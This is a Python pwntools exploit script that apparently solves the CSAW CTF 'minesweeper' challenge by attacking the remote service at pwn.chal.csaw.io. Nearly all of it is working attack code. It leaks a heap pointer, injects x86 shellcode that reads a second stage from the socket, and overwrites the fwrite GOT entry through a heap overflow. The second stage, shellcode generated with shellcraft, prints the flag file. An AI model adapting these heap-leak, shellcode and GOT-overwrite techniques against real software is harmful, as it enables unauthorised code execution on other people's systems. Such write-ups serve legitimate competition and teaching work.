#!/usr/bin/env python
# encoding: utf-8

from pwn import *
import struct

context.clear(arch='i386')
#context.log_level = 'debug'
binary = ELF('./minesweeper')
rop = ROP(binary)

#p = remote('127.0.0.1',31337)
p = remote('pwn.chal.csaw.io', 7478)

p.recvuntil('(Quit)\n')

def newgame():
    p.sendline('N')
    p.recvuntil('Q)\n')

def view():
    p.sendline('v')
    p.sendline('a')
    return p.recvuntil('command!\n')

def initialize(x, y, content):
    p.sendline('i')
    p.recvuntil('B X Y')
    p.sendline('B %d %d' % (x, y))
    p.recvuntil('character X')
    p.sendline(content)

initialize(8, 2, 'X' + cyclic(15))
newgame()
print 'leaking some heap:'
d = view()
heap = u32(d[18:22])
print 'Heap is:',hex(heap)
offset = 0x10

p.sendline('q')

target = heap + offset
print 'Target is:',hex(target)

sc = asm('jmp $+0x9')
sc += '\x90'*9
# /* shellcraft: read(fd=4, buf=134529381, nbytes=200) */
sc += asm('''
        push 4
        pop ebx
        ''' + 'push 0x%x' % target + '''
        pop ecx
        xor edx, edx
        mov dl, 0xc8
        /* call read() */
        push 3 /* 3 */
        pop eax
        int 0x80
        ''' + 'jmp $ + 100')

sploit =  'X'
sploit += '\x90'*3
sploit += sc
sploit += 'A'*(508 - len(sploit))
sploit += p32(binary.got['fwrite']-8) # fwrite addr
sploit += p32(heap + offset) # our addr
sploit += 'B'*(1000 - len(sploit))

initialize(500, 2, sploit)

sc = '\x90'*40 + asm(shellcraft.cat('flag',fd=4))

p.sendline(sc)

p.interactive()
